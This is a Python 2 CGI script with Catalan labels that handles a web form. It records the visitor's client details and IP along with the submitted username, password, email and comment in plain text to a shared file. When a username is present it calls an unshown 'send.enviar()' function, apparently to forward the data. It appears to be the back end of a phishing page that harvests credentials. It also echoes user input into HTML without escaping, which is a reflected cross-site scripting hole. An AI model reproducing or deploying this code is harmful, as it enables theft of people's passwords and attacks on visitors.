#!/usr/bin/python
# -*- encoding:utf-8 -*-

import cgi
import cgitb
import send

cgitb.enable()
form = cgi.FieldStorage()

env = send.envoriment_var()
f = open("/home/shared-stuff/data.txt",'w')
f.write("Client " + str(env[0]))
f.write("\n")
f.write("IP " + str(env[1]))
f.write("\n")
try:
	usr = form["Nom d’usuari"].value
except:
	usr = " "
f.write("Usuari: " + usr)
f.write("\n")
try:
	pss = form["password"].value
except:
	pss = " "
f.write("Contrasenya: " + pss)
f.write("\n")
try:
	m = form["correu"].value
except:
	m = " "
f.write("Correu: " + m)
f.write("\n")

try:
	a = form["comentari"].value
except:
	a = " "
	
f.write("Comentari: " + a)
f.close()

if usr != " ":
	send.enviar()

print "Content-Type:text/html" #Diem que lo que ve es html
print "Content-Language:ca"
print  #Final dels headers

print '<html>'
print '<head>'
print '<meta charset="utf-8"/>'
print '<title> Gràcies </title>'
print '</head>'
print '<body>'
print '<a href="redirect.html"><img class="/var/www/html/foto3" src="inici.png" alt="Inici" title="Inici"></a>'
print '<p>Has completat el formulari correctament</p>'
#print '<b>Password:</b>' + form["password"].value + "<br>"
print '<b>Correu: </b>' + m + "<br>"
print '<b>Nom: </b>' + usr + "<br>"
print '<p> Si vol tornar a la pàgina inicial clica a Inici </p>'
print '</body>'
print '</html>'


